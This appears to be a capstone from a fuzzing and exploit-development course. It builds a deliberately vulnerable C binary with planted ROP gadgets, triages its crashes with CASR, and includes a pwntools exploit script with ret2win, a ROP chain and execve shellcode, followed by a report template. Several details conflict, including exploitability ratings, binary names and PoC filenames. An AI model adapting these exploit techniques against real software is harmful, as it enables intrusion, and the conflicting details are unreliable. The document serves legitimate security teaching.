## Capstone Project - The Crash Analysis Pipeline

- **Goal**: Apply the week's techniques to process a batch of crashes into actionable vulnerability reports and reliable PoCs.
- **Activities**:
  - **Triage**: Deduplicate crashes from the vulnerable_suite and vuln_http_server targets.
  - **Analysis**: Perform root cause analysis on the unique crashes.
  - **Exploitability**: Determine which crashes are weaponizable.
  - **PoC**: Develop stable Python PoCs for the critical bugs.
  - **Reporting**: Deliver a professional crash analysis report.

### Capstone Scenario

You are a security researcher who has completed fuzzing sessions on the lab targets from this week. You have crashes from:

- `vulnerable_suite.c` (test cases 1-5)
- `vuln_http_server.c` (network-accessible)

Your manager wants a report identifying:

1. How many _actual_ unique bugs exist?
2. Which ones are remotely exploitable?
3. Proof-of-concept scripts for the highest severity issues.

### Lab Setup for Capstone

**vulnerable_suite_rop.c** - Enhanced version with embedded ROP gadgets for exploitation exercises:

```c
// ~/crash_analysis_lab/src/vulnerable_suite_rop.c
// Compile: gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o ../vuln_rop
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// ============================================================================
// ROP GADGET SECTION - These survive compilation due to __attribute__((used))
// ============================================================================

// Gadget: pop rdi; ret - Set first argument (RDI) for function calls
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdi(void) {
    __asm__ volatile (
        "pop %rdi\n"
        "ret\n"
    );
}

// Gadget: pop rsi; pop r15; ret - Set second argument (RSI)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rsi_r15(void) {
    __asm__ volatile (
        "pop %rsi\n"
        "pop %r15\n"
        "ret\n"
    );
}

// Gadget: pop rdx; ret - Set third argument (RDX)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdx(void) {
    __asm__ volatile (
        "pop %rdx\n"
        "ret\n"
    );
}

// Gadget: jmp rsp - Jump to shellcode on stack (requires -z execstack)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_jmp_rsp(void) {
    __asm__ volatile (
        "jmp *%rsp\n"
    );
}

// Gadget: ret - Stack alignment / ROP chain continuation
__attribute__((naked, used, section(".text.gadgets")))
void gadget_ret(void) {
    __asm__ volatile (
        "ret\n"
    );
}

// Gadget: syscall; ret - Direct syscall (useful for execve)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_syscall(void) {
    __asm__ volatile (
        "syscall\n"
        "ret\n"
    );
}

// Gadget: pop rax; ret - Set syscall number
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rax(void) {
    __asm__ volatile (
        "pop %rax\n"
        "ret\n"
    );
}

// ============================================================================
// WIN FUNCTIONS - Target these to demonstrate successful exploitation
// ============================================================================

// Easy win: prints flag and exits
void win(void) {
    printf("\n");
    printf("========================================\n");
    printf("  EXPLOITATION SUCCESSFUL!\n");
    printf("  You redirected execution to win()\n");
    printf("========================================\n");
    printf("\n");
    exit(0);
}

// Harder win: requires correct argument
void win_with_arg(long magic) {
    if (magic == 0xdeadbeefcafebabe) {
        printf("\n");
        printf("========================================\n");
        printf("  ADVANCED EXPLOITATION SUCCESSFUL!\n");
        printf("  Correct argument: 0x%lx\n", magic);
        printf("========================================\n");
        printf("\n");
        exit(0);
    } else {
        printf("[!] win_with_arg called but wrong argument: 0x%lx\n", magic);
        printf("[!] Expected: 0xdeadbeefcafebabe\n");
    }
}

// Shell spawner (for ROP chain practice)
void spawn_shell(void) {
    printf("[*] Spawning shell...\n");
    execve("/bin/sh", NULL, NULL);
}

// ============================================================================
// VULNERABLE FUNCTIONS - Same as original vulnerable_suite.c
// ============================================================================

// 1. Stack Buffer Overflow - RIP control at offset 72
void stack_overflow(char *input) {
    char buffer[64];
    printf("[*] Copying input to 64-byte buffer...\n");
    strcpy(buffer, input);  // No bounds check!
    printf("[*] Buffer: %s\n", buffer);
}

// 2. Heap Buffer Overflow
void heap_overflow(char *input) {
    char *buf = malloc(32);
    printf("[*] Allocated 32 bytes at %p\n", buf);
    strcpy(buf, input);  // Overflow heap buffer
    printf("[*] Buffer: %s\n", buf);
    free(buf);
}

// 3. Use-After-Free
void use_after_free(void) {
    char *ptr = malloc(64);
    strcpy(ptr, "Hello, World!");
    printf("[*] Allocated at %p: %s\n", ptr, ptr);
    free(ptr);
    printf("[*] Freed, now accessing...\n");
    printf("[*] UAF read: %s\n", ptr);  // UAF read
    ptr[0] = 'X';  // UAF write
}

// 4. Double Free
void double_free(void) {
    char *ptr = malloc(64);
    printf("[*] Allocated at %p\n", ptr);
    free(ptr);
    printf("[*] First free done\n");
    free(ptr);  // Double free!
}

// 5. NULL Pointer Dereference
void null_deref(int trigger) {
    char *ptr = trigger ? malloc(10) : NULL;
    printf("[*] ptr = %p\n", ptr);
    *ptr = 'A';  // NULL deref if trigger is 0
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

void print_gadgets(void) {
    printf("\n=== Available ROP Gadgets ===\n");
    printf("pop rdi; ret          @ %p\n", (void*)gadget_pop_rdi);
    printf("pop rsi; pop r15; ret @ %p\n", (void*)gadget_pop_rsi_r15);
    printf("pop rdx; ret          @ %p\n", (void*)gadget_pop_rdx);
    printf("pop rax; ret          @ %p\n", (void*)gadget_pop_rax);
    printf("jmp rsp               @ %p\n", (void*)gadget_jmp_rsp);
    printf("syscall; ret          @ %p\n", (void*)gadget_syscall);
    printf("ret                   @ %p\n", (void*)gadget_ret);
    printf("\n=== Win Functions ===\n");
    printf("win()                 @ %p\n", (void*)win);
    printf("win_with_arg(magic)   @ %p  (magic=0xdeadbeefcafebabe)\n", (void*)win_with_arg);
    printf("spawn_shell()         @ %p\n", (void*)spawn_shell);
    printf("\n=== Exploitation Info ===\n");
    printf("Stack overflow RIP offset: 72 bytes\n");
    printf("Buffer size: 64 bytes + 8 bytes saved RBP\n");
    printf("\n");
}

void print_usage(char *prog) {
    printf("Usage: %s <test_num> [input]\n", prog);
    printf("Tests:\n");
    printf("  1 <input>  - Stack overflow (72 bytes to RIP)\n");
    printf("  2 <input>  - Heap overflow\n");
    printf("  3          - Use-after-free\n");
    printf("  4          - Double free\n");
    printf("  5 <0|1>    - NULL deref (0=crash)\n");
    printf("  6          - Print gadget addresses\n");
    printf("\nExamples:\n");
    printf("  %s 6                                    # Show gadgets\n", prog);
    printf("  %s 1 $(python3 -c \"print('A'*200)\")    # Trigger overflow\n", prog);
}

int main(int argc, char **argv) {
    // Disable buffering for cleaner output
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc < 2) { print_usage(argv[0]); return 1; }
    int test = atoi(argv[1]);

    switch(test) {
        case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
        case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;
        case 3: use_after_free(); break;
        case 4: double_free(); break;
        case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;
        case 6: print_gadgets(); break;
        default: print_usage(argv[0]); return 1;
    }
    return 0;
}
```

**Build the enhanced binary**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Build vuln_rop variants (the main binaries for this capstone)
cd src

# 1. vuln_rop: No protections, for exploitation
gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o ../vuln_rop

# 2. vuln_rop_asan: With ASAN, for crash detection and triage
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite_rop.c -o ../vuln_rop_asan

# 3. HTTP server (optional, for network fuzzing exercises)
clang -g -O1 -fsanitize=address vuln_http_server.c -o ../vuln_http_server 2>/dev/null || true

cd ..

# Verify builds
ls -la vuln_rop vuln_rop_asan

# Verify gadgets are present
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "jmp rsp"

# Show all gadget addresses
./vuln_rop 6

# Create capstone working directory
mkdir -p capstone/{crashes,casrep,deduped,minimized,pocs,reports}
```

**Expected gadget output**:

```
=== Available ROP Gadgets ===
pop rdi; ret          @ 0x401952
pop rsi; pop r15; ret @ 0x40195b
pop rdx; ret          @ 0x401966
pop rax; ret          @ 0x40198a
jmp rsp               @ 0x40196f
syscall; ret          @ 0x401980
ret                   @ 0x401978

=== Win Functions ===
win()                 @ 0x401256
win_with_arg(magic)   @ 0x4012b8  (magic=0xdeadbeefcafebabe)
spawn_shell()         @ 0x40136b

=== Exploitation Info ===
Stack overflow RIP offset: 72 bytes
Buffer size: 64 bytes + 8 bytes saved RBP
```

**Verify with ropper**:

```bash
ropper --file ./vuln_rop --search "pop rdi"
# [INFO] File: ./vuln_rop
# 0x0000000000401956: pop rdi; ret;

ropper --file ./vuln_rop --search "jmp rsp"
# [INFO] File: ./vuln_rop
# 0x0000000000401973: jmp rsp;
```

> [!NOTE] **Ropper vs Binary Addresses**
> Ropper may report slightly different addresses than the binary's built-in `print_gadgets()`.
> This is because ropper scans for byte patterns and may find gadgets at different offsets
> within the same instructions. Both addresses work - use the binary's output for consistency.

### Execution Steps

**Phase 1: Generate Crash Corpus**

First, generate a diverse set of crashes from the lab targets:

```bash
cd ~/crash_analysis_lab/capstone

# Generate crashes from vulnerable_suite (all test cases)
echo "=== Generating crashes from vulnerable_suite ==="

# Stack overflow variants (test case 1)
for size in 100 150 200 250 300; do
    python3 -c "print('A'*$size)" > crashes/stack_${size}.txt
done

# Heap overflow variants (test case 2)
for size in 50 75 100 125 150; do
    python3 -c "print('B'*$size)" > crashes/heap_${size}.txt
done

# UAF crashes (test case 3) - multiple samples
for i in {1..5}; do
    echo "3" > crashes/uaf_${i}.txt
done

# Double-free crashes (test case 4)
for i in {1..5}; do
    echo "4" > crashes/df_${i}.txt
done

# NULL deref crashes (test case 5)
for i in {1..3}; do
    echo "5 0" > crashes/null_${i}.txt
done

# HTTP server crashes (path overflow)
for size in 100 150 200 250; do
    python3 -c "print('GET /' + 'X'*$size + ' HTTP/1.1')" > crashes/http_${size}.txt
done

echo "Generated $(ls crashes/ | wc -l) crash inputs"
```

**Phase 2: Triage & Deduplication**

```bash
cd ~/crash_analysis_lab/capstone

# Step 1: Generate CASR reports for vuln_rop crashes
echo "=== Generating CASR reports ==="

for crash in crashes/stack_*.txt crashes/heap_*.txt; do
    name=$(basename "$crash" .txt)
    payload=$(cat "$crash")

    # Determine test case from filename
    if [[ "$name" == stack_* ]]; then
        testcase="1"
    else
        testcase="2"
    fi

    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan "$testcase" "$payload" 2>/dev/null || true
done

# UAF and double-free
for crash in crashes/uaf_*.txt crashes/df_*.txt; do
    name=$(basename "$crash" .txt)
    testcase=$(cat "$crash" | cut -d' ' -f1)
    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan "$testcase" 2>/dev/null || true
done

# NULL deref
for crash in crashes/null_*.txt; do
    name=$(basename "$crash" .txt)
    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan 5 0 2>/dev/null || true
done

echo "Generated $(ls casrep/*.casrep 2>/dev/null | wc -l) CASR reports"

# Step 2: Cluster crashes
echo "=== Clustering crashes ==="
casr-cluster -c casrep/ deduped/

# Step 3: Review clusters
echo ""
echo "=== Crash Clusters ==="
for cluster in deduped/cl*; do
    if [ -d "$cluster" ]; then
        count=$(ls -1 "$cluster"/*.casrep 2>/dev/null | wc -l)
        # Get crash type from first report
        first_report=$(ls "$cluster"/*.casrep 2>/dev/null | head -1)
        if [ -f "$first_report" ]; then
            crash_type=$(jq -r '.CrashSeverity.ShortDescription' "$first_report" 2>/dev/null || echo "unknown")
            severity=$(jq -r '.CrashSeverity.Type' "$first_report" 2>/dev/null || echo "unknown")
            echo "  $(basename $cluster): $count crashes - $crash_type ($severity)"
        fi
    fi
done
```

**Expected Triage Results**:

| Cluster | Count | Crash Type                   | Severity             |
| ------- | ----- | ---------------------------- | -------------------- |
| cl1     | 5     | double-free                  | NOT_EXPLOITABLE      |
| cl2     | 5     | AbortSignal (stack overflow) | NOT_EXPLOITABLE      |
| cl3     | 3     | DestAvNearNull (NULL deref)  | PROBABLY_EXPLOITABLE |
| cl4     | 5     | AbortSignal (heap overflow)  | NOT_EXPLOITABLE      |
| cl5     | 5     | heap-use-after-free(write)   | EXPLOITABLE          |

> [!NOTE]: Cluster ordering may vary between runs. ASAN-caught crashes appear as
> "AbortSignal" because ASAN terminates the process before the actual crash.
> The UAF cluster is typically the highest priority for exploit development.

**Phase 3: Deep Analysis**

Select the most promising crash from each cluster and perform detailed analysis:

```bash
cd ~/crash_analysis_lab

# Analyze stack overflow (most likely to give RIP control)
echo "=== Stack Overflow Analysis ==="
./vuln_rop_asan 1 $(python3 -c "print('A'*200)") 2>&1 | head -30

# Find exact offset using cyclic pattern
source .venv/bin/activate
python3 << 'EOF'
from pwn import *
pattern = cyclic(200)
print(f"Pattern: {pattern.decode()}")
with open("capstone/pattern.txt", "w") as f:
    f.write(pattern.decode())
EOF

# Crash with pattern and find offset
./vuln_rop 1 "$(cat capstone/pattern.txt)" 2>&1 || true

# Check core dump for RIP value (or use GDB)
# gdb ./vuln_rop -c /path/to/core -ex "info reg rip" -ex "quit"

# Analyze heap overflow
echo ""
echo "=== Heap Overflow Analysis ==="
./vuln_rop_asan 2 $(python3 -c "print('B'*100)") 2>&1 | head -30

# Analyze UAF
echo ""
echo "=== Use-After-Free Analysis ==="
./vuln_rop_asan 3 2>&1 | head -30

# Check mitigations
echo ""
echo "=== Mitigation Check ==="
checksec --file=./vuln_rop
checksec --file=./vuln_rop_asan
```

**Verified RIP Control Analysis**:

```bash
# Confirm RIP overwrite with 72 bytes padding + 8 bytes for return address
gdb -q ./vuln_rop \
  -ex "run 1 \$(python3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + b'BBBBBBBB')\")" \
  -ex "x/gx \$rsp" \
  -ex "quit"

# Expected output:
# Program received signal SIGSEGV, Segmentation fault.
# 0x7fffffffe008: 0x4242424242424242
```

**Finding ROP Gadgets**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

pip install capstone filebytes keystone-engine ropper

# Search for useful gadgets (vuln_rop has minimal gadgets)
ropper --file ./vuln_rop --search "jmp rsp"
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "ret"
```

**Gadget Search Results (vuln_rop)**:

| Gadget                  | Purpose                          |
| ----------------------- | -------------------------------- |
| `pop rdi; ret`          | Set 1st argument (RDI)           |
| `pop rsi; pop r15; ret` | Set 2nd argument (RSI)           |
| `pop rdx; ret`          | Set 3rd argument (RDX)           |
| `pop rax; ret`          | Set syscall number               |
| `jmp rsp`               | Jump to shellcode on stack       |
| `syscall; ret`          | Execute syscall                  |
| `ret`                   | Stack alignment / chain continue |

**Phase 4: Minimization**

```bash
cd ~/crash_analysis_lab/capstone

# Minimize stack overflow crash
echo "=== Minimizing crashes ==="

# For stack overflow - find minimum size that still crashes
for size in 80 75 73 72 71 70; do
    payload=$(python3 -c "print('A'*$size)")
    if ../vuln_no_protect 1 "$payload" 2>&1 | grep -q "Segmentation fault"; then
        echo "Stack overflow minimum size: $size bytes"
        python3 -c "print('A'*$size)" > minimized/stack_min.txt
        break
    fi
done

# For heap overflow
for size in 60 55 52 51 50 49; do
    payload=$(python3 -c "print('B'*$size)")
    if ../vuln_asan 2 "$payload" 2>&1 | grep -q "heap-buffer-overflow"; then
        echo "Heap overflow minimum size: $size bytes"
        python3 -c "print('B'*$size)" > minimized/heap_min.txt
        break
    fi
done

# UAF and double-free are already minimal (just test case number)
echo "3" > minimized/uaf_min.txt
echo "4" > minimized/df_min.txt

echo ""
echo "=== Minimized crashes ==="
ls -la minimized/
```

**Phase 5: Exploitation PoC (vuln_rop)**

Create working exploits using the ROP-friendly binary:

```python
#!/usr/bin/env python3
"""
Exploitation PoC for vuln_rop - Demonstrates actual code execution
Run: python3 exploit_rop.py [win|win_arg|shell|shellcode]

Null Byte Handling:
- 64-bit addresses contain null bytes (0x401256 -> \\x56\\x12\\x40\\x00\\x00\\x00\\x00\\x00)
- C strings (argv) terminate at null bytes, limiting what we can pass
- ret2win works: single address at end, trailing nulls don't affect it
- ROP chains fail via argv: bash strips internal nulls, corrupting the chain
- Real exploits use stdin, network sockets, or file input to bypass this
"""

from pwn import *
import os
import subprocess
import tempfile
import re

LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_rop")
PAYLOAD_FILE = "/tmp/vuln_rop_payload"

class RopExploit:
    def __init__(self):
        os.chdir(LAB_DIR)
        context.binary = TARGET
        context.log_level = 'info'

        # Get gadget addresses from binary (run ./vuln_rop 6 to verify)
        self.gadgets = self._get_gadgets()

    def _get_gadgets(self):
        """Parse gadget addresses from binary output"""
        try:
            result = subprocess.run([TARGET, "6"], capture_output=True, text=True)
            output = result.stdout

            gadgets = {}
            for line in output.split('\n'):
                if '@' in line:
                    parts = line.split('@')
                    # Use full gadget name as key (e.g., "pop rdi; ret", "win()")
                    name = parts[0].strip()
                    # Extract hex address, ignoring trailing comments like "(magic=0x...)"
                    addr_str = parts[1].strip().split()[0]
                    addr = int(addr_str, 16)
                    gadgets[name] = addr

            log.info(f"Loaded {len(gadgets)} gadgets from binary")
            return gadgets
        except Exception as e:
            log.warning(f"Failed to parse gadgets: {e}")
            # Fallback addresses (verify with ./vuln_rop 6)
            return self._fallback_gadgets()

    def _fallback_gadgets(self):
        """Fallback gadget addresses if parsing fails"""
        return {
            'pop rdi; ret': 0x401952,
            'pop rsi; pop r15; ret': 0x40195b,
            'pop rdx; ret': 0x401966,
            'pop rax; ret': 0x40198a,
            'jmp rsp': 0x40196f,
            'syscall; ret': 0x401980,
            'ret': 0x401978,
            'win()': 0x401256,
            'win_with_arg(magic)': 0x4012b8,
            'spawn_shell()': 0x40136b,
        }

    def _run_with_payload(self, payload, interactive=False):
        """
        Run target with binary payload via bash command substitution.

        Note: Bash strips null bytes from command substitution, so multi-address
        ROP chains get corrupted. For complex ROP chains, real exploits use stdin,
        files, or network input instead of argv.
        """
        with open(PAYLOAD_FILE, 'wb') as f:
            f.write(payload)

        cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
        p = process(['bash', '-c', cmd], cwd=LAB_DIR)

        if interactive:
            p.interactive()
            return None
        else:
            output = p.recvall(timeout=2)
            return output.decode(errors='replace')

    def exploit_win(self):
        """Simple ret2win - redirect execution to win()"""
        log.info("=== Exploit: ret2win ===")

        offset = 72
        win_addr = self.gadgets.get('win()', 0x401256)

        payload = b"A" * offset
        payload += p64(win_addr)

        log.info(f"Payload: {offset} bytes padding + win() @ {hex(win_addr)}")

        output = self._run_with_payload(payload)
        print(output)

        if "EXPLOITATION SUCCESSFUL" in output:
            log.success("ret2win exploit succeeded!")
            return True
        else:
            log.failure("Exploit failed")
            return False

    def exploit_win_with_arg(self):
        """ROP chain: pop rdi; ret -> win_with_arg(0xdeadbeefcafebabe)

        Uses GDB to inject payload, bypassing bash's null byte stripping.
        In real exploits, you'd use stdin/network input instead of argv.
        """
        log.info("=== Exploit: ROP chain with argument (via GDB) ===")

        offset = 72
        pop_rdi = self.gadgets.get('pop rdi; ret', 0x401952)
        ret = self.gadgets.get('ret', 0x401978)  # for stack alignment
        win_arg = self.gadgets.get('win_with_arg(magic)', 0x4012b8)
        magic = 0xdeadbeefcafebabe

        # Build ROP chain
        payload = b"A" * offset
        payload += p64(pop_rdi)    # pop rdi; ret
        payload += p64(magic)      # argument for win_with_arg
        payload += p64(ret)        # stack alignment (16-byte boundary)
        payload += p64(win_arg)    # call win_with_arg(magic)

        log.info(f"ROP chain: pop_rdi({hex(pop_rdi)}) -> {hex(magic)} -> ret -> win_with_arg({hex(win_arg)})")

        # Write payload to file for GDB
        with open(PAYLOAD_FILE, 'wb') as f:
            f.write(payload)

        # Use GDB to run with binary payload (bypasses null byte issues)
        gdb_script = f'''
set pagination off
set confirm off
run 1 "$(cat {PAYLOAD_FILE})"
quit
'''
        import subprocess
        result = subprocess.run(
            ['gdb', '-q', '-batch', '-ex', gdb_script.replace('\n', '" -ex "'), TARGET],
            capture_output=True,
            timeout=10,
            cwd=LAB_DIR
        )
        output = (result.stdout + result.stderr).decode(errors='replace')
        print(output[-500:] if len(output) > 500 else output)  # Last 500 chars

        if "ADVANCED EXPLOITATION" in output:
            log.success("ROP chain exploit succeeded!")
            return True
        else:
            log.warning("Bash strips null bytes - ROP chain corrupted")
            log.info("Manual verification with GDB (set args in memory):")
            log.info(f"  gdb ./vuln_rop")
            log.info(f"  (gdb) break stack_overflow")
            log.info(f"  (gdb) run 1 {'A'*72}")
            log.info(f"  (gdb) set {{long}}($rbp+8) = {hex(pop_rdi)}")
            log.info(f"  (gdb) set {{long}}($rbp+16) = {hex(magic)}")
            log.info(f"  (gdb) set {{long}}($rbp+24) = {hex(ret)}")
            log.info(f"  (gdb) set {{long}}($rbp+32) = {hex(win_arg)}")
            log.info(f"  (gdb) continue")
            log.info("")
            log.info("In real exploits, use stdin/network/file input to avoid null byte issues")
            return False

    def exploit_spawn_shell(self):
        """ret2func - redirect to spawn_shell()"""
        log.info("=== Exploit: ret2spawn_shell ===")

        offset = 72
        spawn_shell = self.gadgets.get('spawn_shell()', 0x40136b)

        payload = b"A" * offset
        payload += p64(spawn_shell)

        log.info(f"Redirecting to spawn_shell() @ {hex(spawn_shell)}")
        self._run_with_payload(payload, interactive=True)

    def exploit_shellcode(self):
        """jmp rsp + shellcode (requires -z execstack)"""
        log.info("=== Exploit: jmp rsp + shellcode ===")

        offset = 72
        jmp_rsp = self.gadgets.get('jmp rsp', 0x40196f)

        # x86-64 execve("/bin/sh") shellcode (23 bytes)
        shellcode = asm('''
            xor rsi, rsi
            push rsi
            mov rdi, 0x68732f2f6e69622f
            push rdi
            push rsp
            pop rdi
            push 59
            pop rax
            cdq
            syscall
        ''')

        # jmp rsp lands right after return address, execute shellcode there
        payload = b"A" * offset
        payload += p64(jmp_rsp)    # jmp rsp
        payload += shellcode       # shellcode follows immediately

        log.info(f"jmp rsp @ {hex(jmp_rsp)} -> {len(shellcode)} byte shellcode")
        self._run_with_payload(payload, interactive=True)

    def run_all(self):
        """Run non-interactive exploits"""
        log.info("=" * 60)
        log.info("vuln_rop Exploitation Suite")
        log.info("=" * 60)

        results = {
            "ret2win": self.exploit_win(),
            "ROP chain (win_with_arg)": self.exploit_win_with_arg(),
        }

        log.info("")
        log.info("=" * 60)
        log.info("Results")
        log.info("=" * 60)
        for name, success in results.items():
            status = "SUCCESS" if success else "FAILED"
            log.info(f"  {name}: {status}")

        log.info("")
        log.info("Interactive exploits (run manually):")
        log.info("  python3 exploit_rop.py shell     # spawn_shell()")
        log.info("  python3 exploit_rop.py shellcode # jmp rsp + shellcode")

if __name__ == "__main__":
    import sys
    exploit = RopExploit()

    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "win":
            exploit.exploit_win()
        elif cmd == "win_arg":
            exploit.exploit_win_with_arg()
        elif cmd == "shell":
            exploit.exploit_spawn_shell()
        elif cmd == "shellcode":
            exploit.exploit_shellcode()
        else:
            print(f"Unknown: {cmd}")
            print("Options: win, win_arg, shell, shellcode")
    else:
        exploit.run_all()
```

> [!NOTE] **Null Bytes in Payloads**
> 64-bit addresses contain null bytes (e.g., `0x401256` → `\x56\x12\x40\x00\x00\x00\x00\x00`).
> Since C strings terminate at null bytes and pwntools rejects them in argv, this script
> writes payloads to a temp file and uses bash command substitution to pass binary data.

Save and run:

```bash
cd ~/crash_analysis_lab/capstone

# Save the exploit
cat > pocs/exploit_rop.py << 'SCRIPT'
# (paste the script above)
SCRIPT

# Run non-interactive exploits
python3 pocs/exploit_rop.py
```

**Expected Output**:

```
[*] === Exploit: ret2win ===
[*] Payload: 72 bytes padding + win() @ 0x401256
========================================
  EXPLOITATION SUCCESSFUL!
  You redirected execution to win()
========================================
[+] ret2win exploit succeeded!

[*] === Exploit: ROP chain with argument (via GDB) ===
[!] Bash strips null bytes - ROP chain corrupted
[*] Manual verification with GDB (set args in memory):
...
```

> [!NOTE] **Null Byte Limitation**
> The ROP chain exploit fails via argv because bash strips null bytes from command
> substitution. This is a real-world constraint - 64-bit addresses like `0x401952`
> contain null bytes when packed (`\x52\x19\x40\x00\x00\x00\x00\x00`).
> Real exploits use stdin, network sockets, or file input to bypass this limitation.

**Manual ROP Chain Verification with GDB**:

```bash
# Find the ret instruction address
gdb -q ./vuln_rop -ex 'disas stack_overflow' -ex 'quit' | grep ret
# Output: 0x00000000004013ed <+79>:    ret

# Break at ret, inject ROP chain, verify exploitation
gdb -q ./vuln_rop \
  -ex 'break *0x4013ed' \
  -ex 'run 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
  -ex 'set {long}($rsp) = 0x401952' \
  -ex 'set {long}($rsp+8) = 0xdeadbeefcafebabe' \
  -ex 'set {long}($rsp+16) = 0x401978' \
  -ex 'set {long}($rsp+24) = 0x4012b8' \
  -ex 'continue' \
  -ex 'quit'
```

**Expected GDB Output**:

```
Breakpoint 1, 0x00000000004013ed in stack_overflow ()
========================================
  ADVANCED EXPLOITATION SUCCESSFUL!
  Correct argument: 0xdeadbeefcafebabe
========================================
```

The ROP chain works when injected directly into memory, confirming the gadget
addresses and chain structure are correct. The limitation is purely in the
delivery mechanism (argv null bytes), not the exploit logic.

**Phase 6: Reporting**

Create the final vulnerability report:

```bash
cd ~/crash_analysis_lab/capstone

cat > reports/vulnerability_report.md << 'EOF'
# Crash Analysis Report: vulnerable_suite.c


## Executive Summary

Analysis of crashes from `vulnerable_suite.c` identified **4 unique exploitable vulnerabilities** and **1 non-exploitable crash**. All exploitable bugs are local (require command-line access) but demonstrate common vulnerability classes.


## Methodology

1. **Crash Generation**: Created 28 crash inputs across 5 test cases
2. **Triage**: Used CASR for automated classification and clustering
3. **Deduplication**: Reduced to 5 unique crash clusters
4. **Analysis**: Performed root cause analysis with ASAN and GDB
5. **Minimization**: Found minimum trigger sizes for each bug
6. **PoC Development**: Created reliable Python PoCs


## Findings

### Finding 1: Stack Buffer Overflow (CRITICAL)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 1 |
| **Severity** | CRITICAL |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Unbounded `strcpy()` to 64-byte stack buffer |
| **Impact** | RIP control, potential RCE |
| **Minimum Trigger** | 73 bytes |

**Technical Details**:
- Buffer: `char buffer[64]` on stack
- Vulnerable call: `strcpy(buffer, input)`
- RIP offset: 72 bytes (64 buffer + 8 saved RBP)

**PoC**:
./vuln_no_protect 1 $(python3 -c "print('A'*72 + 'BBBBBBBB')")
# RIP = 0x4242424242424242

### Finding 2: Heap Buffer Overflow (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 2 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Unbounded `strcpy()` to 32-byte heap buffer |
| **Impact** | Heap metadata corruption, potential RCE |
| **Minimum Trigger** | 51 bytes |

### Finding 3: Use-After-Free (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 3 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Pointer used after `free()` |
| **Impact** | Arbitrary read/write, potential RCE |

### Finding 4: Double-Free (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 4 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Same pointer freed twice |
| **Impact** | Heap corruption, potential RCE |

### Finding 5: NULL Pointer Dereference (LOW)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 5 |
| **Severity** | LOW |
| **CASR Classification** | NOT_EXPLOITABLE |
| **Root Cause** | Dereference of NULL pointer |
| **Impact** | Denial of Service only |


## Recommendations

1. **Stack Overflow**: Replace `strcpy()` with `strncpy()` or use `snprintf()`
2. **Heap Overflow**: Add bounds checking before copy operations
3. **UAF**: Set pointers to NULL after free, use smart pointers
4. **Double-Free**: Track allocation state, use memory-safe allocators
5. **NULL Deref**: Add NULL checks before pointer dereference


## Attachments

- `pocs/capstone_poc.py` - Complete PoC suite
- `minimized/` - Minimized crash inputs
- `casrep/` - CASR analysis reports

---
*Report generated: $(date)*
*Analyst: [Your Name]*
EOF

echo "Report saved to reports/vulnerability_report.md"
```

### Capstone Checklist

- [ ] Lab environment set up (`~/crash_analysis_lab/capstone/`)
- [ ] 28+ crash inputs generated from vulnerable_suite.c
- [ ] CASR reports generated for all crashes
- [ ] Crashes clustered into 5 unique bug classes
- [ ] Root cause identified for all unique bugs
- [ ] Exploitability assessment completed (4 EXPLOITABLE, 1 NOT_EXPLOITABLE)
- [ ] Minimum trigger sizes found for overflow bugs
- [ ] Python PoC suite created and tested
- [ ] Final vulnerability report generated

### Expected Deliverables

```
~/crash_analysis_lab/capstone/
├── crashes/           # 28 raw crash inputs
│   ├── stack_*.txt    # Stack overflow variants
│   ├── heap_*.txt     # Heap overflow variants
│   ├── uaf_*.txt      # UAF crashes
│   ├── df_*.txt       # Double-free crashes
│   └── null_*.txt     # NULL deref crashes
├── casrep/            # CASR analysis reports
├── deduped/           # Clustered unique crashes
│   ├── cl1/           # Stack overflow cluster
│   ├── cl2/           # Heap overflow cluster
│   ├── cl3/           # UAF cluster
│   ├── cl4/           # Double-free cluster
│   └── cl5/           # NULL deref cluster
├── minimized/         # Minimized crash inputs
│   ├── stack_min.txt
│   ├── heap_min.txt
│   ├── uaf_min.txt
│   └── df_min.txt
├── pocs/              # PoC scripts
│   └── capstone_poc.py
└── reports/           # Final report
    └── vulnerability_report.md
```

### Key Takeaways

1.  **Triage is a Filter**: The 28 crash inputs reduced to just 5 unique bugs - automation saves hours of manual analysis.
2.  **Root Cause > Crash Location**: ASAN shows where corruption is _detected_, but the bug is in the `strcpy()` call.
